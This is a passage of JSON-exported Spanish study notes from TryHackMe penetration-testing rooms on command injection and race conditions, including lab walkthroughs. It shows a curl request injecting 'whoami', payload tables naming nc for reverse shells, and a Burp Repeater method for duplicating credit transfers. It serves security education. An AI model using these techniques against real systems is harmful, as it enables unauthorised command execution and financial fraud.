    "content": "Normalmente puedes determinar si ocurrir√° o no la inyecci√≥n de comandos por el comportamiento de la aplicaci√≥n.\n\nLas aplicaciones que usan el input del usuario para poblar comandos de sistema con informaci√≥n, puede, por lo general, ser combinada con comportamientos no deseados. Por ejemplo, los operadores de consola `;`, `&` y `&&`, combinar√°n dos (o m√°s) comandos de sistema y los ejecutar√° los dos.\n\nLa inyecci√≥n de comandos puede ser detectada de dos maneras, principalmente:\n\n1. Inyecci√≥n de comandos a ciegas (Blind).\n2. Inyecci√≥n de comandos con respuesta (Verbose).\n\nAqu√≠ debajo una tabla donde se explica m√°s detalladamente:\n\n\n| **M√©todo** | **Descripci√≥n**                                                                                                                                                                               |\n| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Blind      | Este tipo de inyecci√≥n ocurre cuando no hay un output directo de la aplicaci√≥n al comprobar payloads. Deber√°s investigar los comportamientos de la aplicaci√≥n para saber si fue o no exitoso. |\n| Verbose    | Este tipo de inyecci√≥n ocurre cuando hay un feedback directo de la aplicaci√≥n una vez mandado el payload.                                                                                     |\n\n--------------------------\n<h2>Detectar Blind Command Injection</h2>\nPara este tipo de inyecci√≥n de comandos, necesitaremos usar payloads que causen alg√∫n tipo de retardo. Por ejemplo `ping` o `sleep`. Al usar `ping`, la aplicaci√≥n esperar√° unos segundos, en relaci√≥n a la cantidad de pings especificados.\n\nOtro m√©todo es forzar alg√∫n output. Esto se puede hacer usando redirectores como `>`. Por ejemplo, podemos decirle a la aplicaci√≥n web que ejecute comandos como `whoami` y los redirija a un archivo. Luego podemos usar un comando como `cat` para leer el nuevo archivo.\n\nEs dif√≠cil y requiere experimentaci√≥n comprobar este tipo de inyecci√≥n de comandos. El comando `curl` nos puede ayudar bastante ya que podemos enviar y recibir informaci√≥n de la web con √©l. Por ejemplo: `curl http://vulnerable.app/process.php%3Fsearch%3Fsearch%3DThe%20Beatles%3B%20whoami`\n\n----------------------------\n<h2>Detectar Verbose Command Injection</h2>\nEs el m√©todo m√°s f√°cil de los dos ya que la aplicaci√≥n muestra la respuesta del servidor en alguna parte, por lo que enseguida sabremos si es vulnerable.\n\nPor ejemplo, el output de `ping` o `whoami` se mostrar√° directamente en la web.\n\n---------------------------------\n<h2>Payloads √ötiles</h2>\nAqu√≠ se muestran algunos comandos √∫tiles para Linux y para Windows.\n\n<h5>Linux</h5>\n\n| **Payload** | **Descripci√≥n**                                                                                         |\n| ----------- | ------------------------------------------------------------------------------------------------------- |\n| whoami      | Te muestra qu√© usuario est√° corriendo la aplicaci√≥n.                                                    |\n| ls          | Lista el contenido del directorio actual o del que se indique.                                          |\n| ping        | Hace que la aplicaci√≥n se pare mientras realiza el test de conectividad a la IP dada.                   |\n| sleep       | Hace que la aplicaci√≥n se pare durante los segundos indicados.                                          |\n| nc          | Puede usarse para abrir una reverse shell de la aplicaci√≥n vulnerable en un servidor de control propio. |\n\n<h5>Windows</h5>\n\n| **Payload** | **Descripci√≥n**                                                                       |\n| ----------- | ------------------------------------------------------------------------------------- |\n| whoami      | Ve bajo qu√© usuario est√° corriendo la aplicaci√≥n.                                     |\n| dir         | Lista los contenidos del directorio actual.                                           |\n| ping        | Hace que la aplicaci√≥n se pare mientras realiza el test de conectividad a la IP dada. |\n| timeout     | Hace que la aplicaci√≥n se pare durante los segundos indicados.                        |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Practical - Command Injection (Deploy)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/10-command-injection/5-practical-command-injection-deploy/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/10. Command Injection/5. Practical - Command Injection (Deploy).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 10. Command Injection",
    "content": "Prueba algunos de los payloads vistos en la aplicaci√≥n proporcionada. Mira en esta [chuleta](https://github.com/payloadbox/command-injection-payload-list) si te atascas o deseas saber comandos m√°s complejos.\n\nEncuentra los contenidos de `/home/tryhackme/flag.txt`.\n\n-------------------------------\n<h2>Challenge</h2>\n1. Vamos a la p√°gina que nos dan.\n   ![[Pasted image 20251113172035.png]]\n2. Probamos con lo que nos dan y vemos lo que sale.\n   ![[Pasted image 20251113172302.png]]\n3. Es un verbose command injection as√≠ que probaremos a introducir `whoami`.\n   ![[Pasted image 20251113172337.png]]\n   No sale nada, parece que o bien filtra el output, o s√≥lo nos deja meter n√∫meros o est√° metiendo nuestro input dentro del comando `ping`.\n   \n4. Probamos a meter la direcci√≥n de google y luego otra IP que no exista.\n   ![[Pasted image 20251113172551.png]]\n5. Parece que la m√°quina no tiene conexi√≥n a Internet o servicio DNS configurado, probaremos con el hostname de google.\n   ![[Pasted image 20251113172706.png]]\n   Esto nos confirma que efectivamente no tiene conectividad directa a internet pero tambi√©n nos deja claro que se est√° parseando el input del usuario hacia el comando `ping` de la siguiente manera: `ping <UserInput>`. Y adem√°s no muestra los errores, por eso si no metemos una direcci√≥n IP/hostname no sale nada en el output. \n   \n6. Vamos a probar a meter una direcci√≥n IP y luego inyectar otro comando para leer la flag.\n   ![[Pasted image 20251113173028.png]]\n\n>[!NOTE] Lo podr√≠amos haber hecho con `&&` porque el primer comando se ejecuta correctamente como ya hab√≠amos visto.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Web Application Architecture",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/4-web-application-architecture/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/4. Web Application Architecture.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
    "content": "Veamos algunos conceptos sobre arquitectura de aplicaciones web para entender c√≥mo son posibles las race conditions.\n\n-----------------------------\n<h2>Modelo Cliente-Servidor</h2>\nLas aplicaciones web siguen un modelo cliente-servidor:\n\n- **Cliente:** El cliente es el programa o aplicaci√≥n que inicia la petici√≥n de un servicio. Por ejemplo, cuando el navegador busca una p√°gina web y env√≠a una petici√≥n al servidor para que le devuelva la p√°gina.\n- **Servidor:** El servidor es el programa o sistema que ofrece estos servicios en respuesta a las peticiones entrantes. Por ejemplo, el servidor web responde a una petici√≥n HTTP `GET` entrante con la p√°gina o recurso pedido.\n\nGeneralmente, el modelo cliente-servidor corre en una red. El cliente manda la petici√≥n a trav√©s de esta y el servidor la recibe y la procesa antes de mandar de vuelta el recurso requerido.\n\n------------------------------------\n<h2>Aplicaci√≥n Web T√≠pica</h2>\nUna aplicaci√≥n web sigue una arquitectura multinivel. Dicha arquitectura separa la l√≥gica de la aplicaci√≥n en varias capas. Los dise√±os m√°s comunes usan estos tres niveles:\n\n- **Nivel de Presentaci√≥n:** En aplicaciones web, este nivel consiste en el navegador del lado del cliente. El navegador renderiza el contenido HTML, CSS y JavaScript.\n- **Nivel de Aplicaci√≥n:** Este nivel contiene la l√≥gica de la aplicaci√≥n y su funcionalidad. Recibe peticiones del cliente, las procesa e interact√∫a con el nivel de datos. Se integra usando lenguajes de programaci√≥n del lado del servidor como Node.js o PHP.\n- **Nivel de Datos:** Este nivel es responsable de guardar y manipular la informaci√≥n de la aplicaci√≥n. Las operaciones t√≠picas de bases de datos incluyen **CRUD**. Se suele implementar usando DBMS, Sistemas de Gesti√≥n de Bases de Datos.\n\n![[Pasted image 20251110235239.png]]\n\n---------------------------------\n<h2>Estados</h2>\nVeamos algunos ejemplos de l√≥gica de negocio antes de seguir:\n\n- Validar y realizar transferencias de dinero.\n- Validar c√≥digos de cupones y aplicar descuentos\n\n---------------------------------------\n<h2>Validar y Realizar Transferencias de Dinero</h2>\nConsidera el ejemplo de transferir dinero a un amigo o a tu otra cuenta. El proceso del programa har√° lo siguiente:\n\n1. El usuario hace click en \"Confirmar Transacci√≥n\".\n2. La aplicaci√≥n le pide a la base de datos que confirme que el balance de la cuenta cubre el gasto de la transferencia.\n3. La base de datos responde a la petici√≥n:\n\t1. Si la cantidad est√° en los l√≠mites, la aplicaci√≥n lleva a cabo la transacci√≥n.\n\t2. Si la cantidad no est√° dentro de los l√≠mites, la aplicaci√≥n muestra un mensaje de error.\n\t   ![[Pasted image 20251110235727.png]]\n\nEn un escenario ideal, el c√≥digo de arriba conlleva a dos estados de programa:\n\n- Cantidad no enviada.\n- Cantidad enviada.\n  ![[Pasted image 20251110235838.png]]\n\n---------------------------------\n<h2>Validar C√≥digos de Cupones y Aplicar Descuentos</h2>\nConsideremos el ejemplo de aplicar cupones distintos. El usuario va a su carrito de la compra y a√±ade un cup√≥n para obtener un descuento. Los pasos pueden ser algo como:\n\n1. El usuario introduce el c√≥digo del cup√≥n.\n2. La aplicaci√≥n hace una petici√≥n a la base de datos para determinar si el cup√≥n es v√°lido y si existen restricciones.\n3. La base de datos responde con la validaci√≥n y restricciones:\n\t1. Se aplica el descuento si es v√°lido  y no aplican restricciones para dicho usuario.\n\t2. Salta un mensaje de error si el c√≥digo es inv√°lido o si existen restricciones que se apliquen al usuario.\n\t   ![[Pasted image 20251111001514.png]]\n\nEl ejemplo de arriba conlleva a dos resultados:\n\n- Se aplica el cup√≥n.\n- No se aplica el cup√≥n.\n  ![[Pasted image 20251111001601.png]]\n\n---------------------------------------\n<h2>¬øDos Estados? Piensa Otra Vez</h2>\nContinuemos nuestro an√°lisis de aplicar un cup√≥n. Idealmente, esperamos dos estados: **Cup√≥n Aplicado** y **Cup√≥n no Aplicado**. Sin embargo, esto es muy simplista en un entorno sofisticado real. Podemos a√±adir estados intermediarios: **Comprobar la Aplicabilidad del Cup√≥n**.\n\n![[Pasted image 20251111001809.png]]\n\nDependiendo de c√≥mo est√© desarrollada la aplicaci√≥n, podemos a√±adir m√°s estados. Por ejemplo, comprobar la aplicabilidad de un cup√≥n puede implicar m√°s de un estado: **Comprobar la Validez del Cup√≥n** y **Comprobar las Restricciones del Usuario que lo Introduce**.\n\n![[Pasted image 20251111002014.png]]\n\n----------------------------------------\n<h2>¬øPor qu√© es importante esto para las Race Conditions?</h2>\nEn el diagrama de estado de arriba, podemos ver que pasamos a trav√©s de m√∫ltiples estados antes de que el cup√≥n se marque como **Aplicado**. Dibujemos los estados en un eje:\n\n![[Pasted image 20251111002145.png]]\n\nHay una ventana de tiempo entre el instante en el que tratamos de a√±adir un cup√≥n y el instante en el cual el cup√≥n es marcado como aplicado y no puede ser aplicado de nuevo. Mientras que el cup√≥n no sea marcado como aplicado, no habr√° controles (lo m√°s seguro) que impidan volver a aplicarlo.\n\nLa situaci√≥n es similar a cuando consideramos los estados del programa que hace una transferencia de dinero. Aunque idealmente ser√≠an dos estados, considerando la l√≥gica de negocio, podemos modificar r√°pidamente el flujo para incluir un estado m√°s.\n\n![[Pasted image 20251111002607.png]]\n\nSin embargo, incluso si la aplicaci√≥n web es vulnerable, tenemos otro reto que resolver: el timing. Incluso en aplicaciones vulnerables, el margen de tiempo (ventana de oportunidad) es relativamente peque√±o. En la pr√°ctica esperamos poder repetir las peticiones necesarias en milisegundos.\n\n¬øC√≥mo podemos conseguir esto? Necesitamos una herramienta como Burp Suite.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
    "content": "Te encargan comprobar la seguridad de una aplicaci√≥n de compra online. Varias preguntas te asaltan. ¬øPodr√© reutilizar una tarjeta de regalo para pagar por un √≠tem de 100‚Ç¨? ¬øPodr√© aplicar el mismo descuento varias veces? Puede ser, si el sistema no est√° bien configurado y es susceptible a la vulnerabilidad race condition.\n\nUna situaci√≥n race condition ocurre cuando los programas de ordenador donde el timing de los eventos influye al comportamiento y resultado. Normalmente ocurre cuando una variable es accedida y procesada/modificada por m√∫ltiples hilos.\n\n-------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nDespu√©s de completar esta habitaci√≥n, aprender√°s lo siguiente:\n\n- Vulnerabilidad de Race Condition.\n- Usar el Repetidor de Burp Suite para explotar Race Conditions.\n- Hilos y multi-hilos.\n- Diagramas de estado.\n\n-------------------------\n<h2>Pre-requisitos</h2>\n- [[3. How the Web Works]]\n- [[0. Packets and Frames]]\n- [[0. Burp Suite - The Basics]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Race Conditions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/3-race-conditions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/3. Race Conditions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
    "content": "<h2>Analog√≠a del Mundo Real</h2>\nImagina la siguiente situaci√≥n. Llamas a un restaurante para reservar una mesa para una comida de negocios crucial. Conoces el restaurante y su disposici√≥n y eliges una mesa en concreto, la 17. A la vez que ocurre tu llamada, otro cliente est√° realizando una llamada similar por la misma mesa.\n\n¬øQui√©n merece realmente la mesa? Eso es una race condition.\n\n¬øPor qu√© pas√≥ esto? Ocurri√≥ porque m√°s de una persona quer√≠a hacer una reserva a la vez de la misma cosa. Adem√°s, como toma al menos un minuto al due√±o poner la etiqueta de reservado en la mesa, hay un periodo de tiempo durante el cual otra persona puede reservarla.\n\n----------------------------\n<h2>Ejemplo A</h2>\nConsideremos el siguiente escenario:\n\n- Una cuenta de banco tiene 100‚Ç¨.\n- Dos hilos intentan sacar dinero a la vez.\n- El hilo 1 mira el balance, ve 100‚Ç¨, y saca 45‚Ç¨.\n- **Antes** de que el hilo 1 actualice el balance, el hilo 2 intenta hacer lo mismo, ve 100‚Ç¨ (incorrectamente), y saca 35‚Ç¨.\n\nNo podemos estar 100% seguros de qu√© hilo actualizar√° el valor primero. Pongamos que el hilo 1 lo actualiza primero, ahora el balance es 55‚Ç¨. Si ahora el hilo 2 actualiza el balance nuevamente, lo pondr√° en 65‚Ç¨. En pocas palabras, el usuario hizo dos retiradas pero s√≥lo se le dedujo el dinero de una del balance total, porque el hilo dos as√≠ lo dijo.\n\n--------------------------------\n<h2>Ejemplo B</h2>\nConsideremos otro escenario:\n\n- Una cuenta de banco tiene 75‚Ç¨.\n- Dos hilos intentan sacar dinero al mismo tiempo.\n- El hilo 1 comprueba el balance, ve 75‚Ç¨, y saca 20‚Ç¨.\n- **Antes** de que el hilo 1 actualice el dinero, el hilo dos mira lo que hay, ve 75‚Ç¨ (incorrectamente), y saca 50‚Ç¨.\n\nAhora en la cuenta quedar√°n 25‚Ç¨, cuando deber√≠an quedar 5‚Ç¨ o no haberse realizado la segunda operaci√≥n.\n\nEstos dos ejemplos muestran la vulnerabilidad TOCTOU (Time-of-Check to Time-of-Use).\n\n--------------------------------\n<h2>C√≥digo de Ejemplo</h2>\nConsidera el siguiente c√≥digo de Python con dos hilos simulando la completitud de una tarea en incrementos del 10%.\n\n```python\nimport threading\n\nx = 0  # Shared variable\n\ndef increase_by_10():\n    global x\n    for i in range(1, 11):\n        x += 1\n        print(f\"Thread {threading.current_thread().name}: {i}0% complete, x = {x}\")\n\n# Create two threads\nthread1 = threading.Thread(target=increase_by_10, name=\"Thread-1\")\nthread2 = threading.Thread(target=increase_by_10, name=\"Thread-2\")\n\n# Start the threads\nthread1.start()\nthread2.start()\n\n# Wait for both threads to finish\nthread1.join()\nthread2.join()\n\nprint(\"Both threads have finished completely.\")\n```\n\nEstos dos hilos comienzan juntos. No hacen nada m√°s que imprimir un valor en la pantalla. Consecuentemente, uno esperar√≠a que terminasen a la vez, o al menos que el resultado fuera consistente. Sin embargo, en el programa de arriba, no hay garant√≠a de qu√© hilo terminar√° primero y c√≥mo de pronto lo har√°.\n\nAqu√≠ una primera ejecuci√≥n:\n\n```shell\npython t3_race_to_100.py\n...\nThread Thread-1: 40% complete, x = 10\nThread Thread-2: 70% complete, x = 11\nThread Thread-1: 50% complete, x = 12\nThread Thread-2: 80% complete, x = 13\nThread Thread-1: 60% complete, x = 14\nThread Thread-1: 70% complete, x = 16\nThread Thread-2: 90% complete, x = 15\nThread Thread-2: 100% complete, x = 17\nThread Thread-1: 80% complete, x = 18\nThread Thread-1: 90% complete, x = 19\nThread Thread-1: 100% complete, x = 20\nBoth threads have finished completely.\n```\n\nY aqu√≠ una segunda:\n\n```shell\npython t3_race_to_100.py \n...\nThread Thread-1: 70% complete, x = 10\nThread Thread-2: 40% complete, x = 11\nThread Thread-1: 80% complete, x = 12\nThread Thread-2: 50% complete, x = 13\nThread Thread-1: 90% complete, x = 14\nThread Thread-2: 60% complete, x = 15\nThread Thread-1: 100% complete, x = 16\nThread Thread-2: 70% complete, x = 17\nThread Thread-2: 80% complete, x = 18\nThread Thread-2: 90% complete, x = 19\nThread Thread-2: 100% complete, x = 20\nBoth threads have finished completely.\n```\n\nEjecutar este programa distintas veces resultar√° en resultados diferentes.\n\n-------------------------------\n<h2>Causas</h2>\nComo vimos en el √∫ltimo programa, dos variables estaban cambiando la misma variable. Cada vez que a un hilo se le daba tiempo de CPU, este corr√≠a para incrementar `x` en 1. Estos dos hilos estaban haciendo una carrera para incrementar la misma variable.\n\nUna de las causas de las race conditions recae en el uso compartido de recursos. Hay muchas causas pero mencionaremos algunas:\n\n- **Ejecuci√≥n Paralela:** Los servidores web pueden ejecutar varias peticiones en paralelos. Si estas acceden y modifican recursos compartidos sin sincronizaci√≥n correcta, pueden conllevar a race conditions.\n- **Operaciones en Bases de Datos:** Las operaciones concurrentes en bases de datos, como read-modify-write pueden producir race conditions.\n- **Librer√≠as y Servicios de Terceros:** Hoy en d√≠a la mayor√≠a de aplicaciones web integran el uso de librer√≠as de terceros o APIs. Si estas no est√°n dise√±adas para manejar acceso concurrente adecuadamente, pueden derivar en race conditions.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Detection and Mitigation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/6-detection-and-mitigation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/6. Detection and Mitigation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
    "content": "<h2>Detecci√≥n</h2>\nDetectar race conditions desde la perspectiva del due√±o puede ser complicado. Si unos cuantos usuarios reclamaran la misma tarjeta de regalo m√∫ltiples veces, probablemente no se notar√≠a a no ser que los logs est√©n siendo monitorizados y filtrados en busca de este tipo de actividad. Por eso se necesita la ayuda de pentesters y bug bounty hunters.\n\nLos pentesters deben entender c√≥mo funciona el sistema bajo condiciones normales cuando los controles son reforzados. Estos controles pueden ser: usar una vez, votar una vez, puntuar una vez, limitar al balance, limitar cada cierto tiempo, etc. El pr√≥ximo paso ser√≠a tratar de circunvalar este l√≠mite aprovechando race conditions.\n\n--------------------------\n<h2>Mitigaci√≥n</h2>\nListaremos unas cuantas t√©cnicas de mitigaci√≥n.\n\n- **Mecanismos de Sincronizaci√≥n:** Los lenguajes de programaci√≥n modernos ofrecen mecanismos de sincronizaci√≥n como \"locks\". Un √∫nico hilo puede adquirir el \"lock\" a la vez, previniendo que otros accedan al mismo recurso hasta que se libere.\n- **Operaciones At√≥micas:** Las operaciones at√≥micas se refieren a unidades de ejecuci√≥n indivisibles. Un conjunto de instrucciones agrupado y ejecutado sin interrupci√≥n de otro hilo.\n- **Transacciones de Bases de Datos:** Las transacciones agrupan m√∫ltiples operaciones de bases de datos en una unidad. Consecuentemente, todas las operaciones en la transacci√≥n tienen √©xito o todas fracasan.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Exploiting Race Conditions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/5-exploiting-race-conditions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/5. Exploiting Race Conditions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
    "content": "La siguiente aplicaci√≥n pertenece a un operador m√≥vil y permite transferencia de cr√©dito m√≥vil. En esta pr√°ctica comprobaremos si el sistema es susceptible de una vulnerabilidad race condition y trataremos de explotarla transfiriendo m√°s cr√©dito del que tenemos en la cuenta.\n\nPrimero necesitamos explorar y estudiar c√≥mo la aplicaci√≥n web objetivo recibe las peticiones HTTP y c√≥mo responde a ellas. Usando Burp Suite, haz click en abrir navegador. De esta manera podemos explorar c√≥mo procesa las peticiones HTTP y sus respuestas.\n\nLogu√©ate en cualquiera de las cuentas y haz click en el bot√≥n **Pay & Recharge**. Hagamos una transferencia de cr√©dito. Haz click en el bot√≥n **Transfer** e introduce el n√∫mero de m√≥vil de la otra cuenta junto con la cantidad que quieres transferir. Puedes intentar transferirte una cantidad que exceda tu balance actual y una cantidad peque√±a, como 1$ para ver c√≥mo se comporta el sistema en cada caso.\n\n-----------------------------------\n<h2>Burp Suite: Repeater</h2>\nEn la imagen de abajo podemos ver:\n\n1. Una petici√≥n `POST`.\n2. Los detalles muestran el n√∫mero de tel√©fono y la cantidad a transferir.\n3. En la respuesta, podemos ver que la transacci√≥n fue exitosa.\n\n![[Pasted image 20251111223550.png]]\n\nAhora que hemos visto c√≥mo reacciona el sistema a peticiones v√°lidas, probemos a explotar una race condition. Haz click derecho en la petici√≥n `POST` que quieres duplicar y elige **Send to Repeater**.\n\n![[Pasted image 20251111224452.png]]\n\nEn la pesta√±a del repetidor hacemos lo siguiente:\n\n1. Click en el icono `+` y seleccionamos **Create tab group**.\n2. Asignamos un nombre al grupo e incluimos la pesta√±a de la petici√≥n que acabamos de mandar al importer antes de hacer click en **Create**.\n3. Hacemos click derecho en la pesta√±a de petici√≥n y elegimos **Duplicate tab** (si la opci√≥n no est√° disponible en nuestra versi√≥n podemos presionar **Ctrl+R** varias veces en su lugar).\n4. Como punto de partida lo duplicaremos 20 veces.\n5. Al lado del bot√≥n **Send**, la flecha que apunta hacia abajo abrir√° un men√∫ para decidir c√≥mo queremos mandar las peticiones duplicadas.\n\n![[Pasted image 20251111224949.png]]\n![[Pasted image 20251111224955.png]]\n\nDespu√©s, explotaremos la aplicaci√≥n objetivo mandando peticiones duplicadas. Usando las funciones del Repetidor de Burp Suite, la flecha de abajo ofrece las siguientes opciones:\n\n- Mandar grupo en secuencia (**conexi√≥n √∫nica**).\n- Mandar grupo en secuencia (**conexi√≥n separada/m√∫ltiple**).\n- Mandar grupo en paralelo.\n\n-----------------------------------\n<h2>Mandar Grupo de Peticiones en Secuencia</h2>\nMandar el grupo en secuencia ofrece dos opciones:\n\n- Mandar grupo en secuencia (**conexi√≥n √∫nica**).\n- Mandar grupo en secuencia (**conexi√≥n separada/m√∫ltiple**).\n\n<h5>Mandar el Grupo en Secuencia a Trav√©s de una √önica Conexi√≥n</h5>\nEsta opci√≥n establece una √∫nica conexi√≥n al servidor y manda todas las peticiones del grupo de pesta√±as antes de cerrar la conexi√≥n. Puede ser √∫til para comprobar vulnerabilidades de desincronizaci√≥n potenciales del lado del cliente.\n\n<h5>Mandar el Grupo en Secuencia a Trav√©s de M√∫ltiples Conexiones</h5>\nComo el nombre sugiere, esta opci√≥n establece una conexi√≥n TCP, manda una petici√≥n del grupo, cierra la conexi√≥n y repite el proceso con cada una de las peticiones.\n\n Comprobamos esta opci√≥n en el ataque a la aplicaci√≥n. La imagen de debajo muestra 21 conexiones TCP para las diferentes posiciones `POST` en el grupo.\n\n- El primer grupo (etiquetado como 1), compete 5 peticiones exitosas. Podr√≠amos confirmar que fueron exitosas comprobando las respuestas respectivas. Adem√°s notamos que cada una tom√≥ alrededor de 3 segundos, como se indica en la duraci√≥n (etiquetada como 3).\n- El segundo grupo (etiquetado como 2), muestra 16 peticiones denegadas. La duraci√≥n fue de unos 4 milisegundos. Es interesante observar el tiempo de comienzo relativo.\n\n![[Pasted image 20251111232510.png]]\n\nLa imagen de debajo muestra la conexi√≥n TCP completa para una petici√≥n. Podemos confirmar que la petici√≥n `POST` fue mandada en un solo paquete.\n\n![[Pasted image 20251111232601.png]]\n\n-----------------------------------------\n<h2>Mandar Grupo de Peticiones en Paralelo</h2>\nElegir mandar el grupo de peticiones en paralelo disparar√≠a al repetidor para que mandase las peticiones en un grupo a la vez. En este caso notar√≠amos lo siguiente, como se muestra en la imagen de abajo:\n\n- En la columna de Comienzo Relativo, notamos que los 21 paquetes se andan en una ventana de 0,5 milisegundos (etiquetado con un 1).\n- Todas las peticiones fueron exitosas, resultaron en una transferencia de cr√©dito exitosa. Cada petici√≥n tom√≥ alrededor de 3,2 segundos en completarse (etiquetado con un 2).\n\n![[Pasted image 20251111235311.png]]\n\nPrestando atenci√≥n a la imagen de arriba, notamos que cada petici√≥n llev√≥ a 12 paquetes, en el intento anterior vemos que s√≥lo fueron 10. ¬øPor qu√© pasa esto?\n\nDe acuerdo a la documentaci√≥n de [Burp Suite: Mandar Peticiones HTTP en Grupo](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group), al mandar en paralelo, el repetidor implementa diferentes t√©cnicas para sincronizar la llegada de las peticiones al objetivo. La t√©cnica de sincronizaci√≥n depende del protocolo usado:\n\n- En el caso de HTTP/2+, el repetidor intenta mandar el grupo entero en un √∫nico paquete. En otras palabras, un s√≥lo paquete TCP podr√≠a llevar m√∫ltiples peticiones.\n- En el caso de HTTP/1, el repetidor recurre a la sincronizaci√≥n del √∫ltimo byte. Este truco se consigue omitiendo el √∫ltimo byte de la solicitud. La imagen de abajo muestra nuestras peticiones `POST` mandadas en dos paquetes.\n  ![[Pasted image 20251112000130.png]]\n\n-----------------------------------------\n<h2>Challenge</h2>\n>[!CAUTION] CUIDADO: Mira el final de la p√°gina antes de seguir la pr√°ctica.\n\nEn este reto debemos conseguir que una de las dos cuentas obtenga m√°s de 100$ de cr√©dito. Para ello se nos proporcionan las credenciales de las cuentas:\n\n- User1: `07799991337`\n- Password: `pass1234`\n\n- User2: `07113371111`\n- Password: `pass1234`\n\nVamos con la resoluci√≥n.\n\n1. Nos dirigimos a la p√°gina dada.\n   ![[Pasted image 20251112000430.png]]\n2. Nos logueamos en ambas cuentas y echamos un vistazo.\n   ![[Pasted image 20251112000603.png]]\n   ![[Pasted image 20251112000639.png]]\n3. Probamos a mandar m√°s del saldo que tenemos y luego una cantidad muy peque√±a, para ver lo que pasa.\n   ![[Pasted image 20251112001905.png]]\n   ![[Pasted image 20251112001922.png]]\n   ![[Pasted image 20251112002004.png]]\n   ![[Pasted image 20251112002020.png]]\n   ![[Pasted image 20251112002138.png]]\n4. Ahora que sabemos c√≥mo funciona, vamos a abrir Burp Suite y su navegador para intentar explotar la rece condition.\n\t1. Usando ahora el navegador de Burp Suite y con la interceptaci√≥n encendida procedemos.\n\t   ![[Pasted image 20251112002712.png]]\n\t2. La mandamos al repetidor as√≠ o con **Ctrl+R**.\n\t   ![[Pasted image 20251112002831.png]]\n\t3. Creamos un grupo de pesta√±as.\n\t   ![[Pasted image 20251112002937.png]]\n\t4. Le ponemos nombre.\n\t   ![[Pasted image 20251112003346.png]]\n\t5. Duplicamos la pesta√±a.\n\t   ![[Pasted image 20251112003434.png]]\n\t   ![[Pasted image 20251112003452.png]]\n\t6. Mandamos las pesta√±as en paralelo.\n\t   ![[Pasted image 20251112003919.png]]\n\t7. Ahora mandamos el dinero bien: \n\t   ![[Pasted image 20251112005130.png]]\n\t8. Obtenemos la flag:\n\t   ![[Pasted image 20251112005303.png]]\n\n\n\n\n>[!CAUTION] Despu√©s de haber trasteado he visto que si intentas mandar 100 de primeras no te deja porque no tienes suficiente. Tampoco te deja de segundas porque tampoco tienes suficiente. El truco est√° en mandar una cantidad que s√≠ tengas m√∫ltiples veces. Yo mand√© 4$ 20 veces por un total de 80 \\$. El problema es que lo tienes que hacer todo de una porque si no se bloquea el nuevo saldo. Lo que hice para remediarlo fue pasarme 80\\$ de vuelta y as√≠ tengo 11 en la otra cuenta (me havia quedado en -68$ o algo as√≠). Ahora me mandar√© 10$ 20 veces.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Multi-Threading",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/3-introduction-to-web-hacking/9-race-conditions/2-multi-threading/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/3. Introduction to Web Hacking/9. Race Conditions/2. Multi-Threading.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 3. Introduction to Web Hacking > 9. Race Conditions",
